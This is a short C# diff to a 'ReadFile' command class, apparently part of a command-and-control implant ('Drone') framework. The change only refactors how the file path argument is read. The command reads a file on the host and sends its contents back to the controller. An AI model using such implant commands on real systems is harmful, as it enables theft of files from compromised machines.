@@ -11,7 +11,7 @@ public sealed class ReadFile : DroneCommand
 
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var text = File.ReadAllText(task.Arguments[0]);
+        var text = File.ReadAllText(task.Arguments["path"]);
         await Drone.SendTaskOutput(task.Id, text);
     }
 }
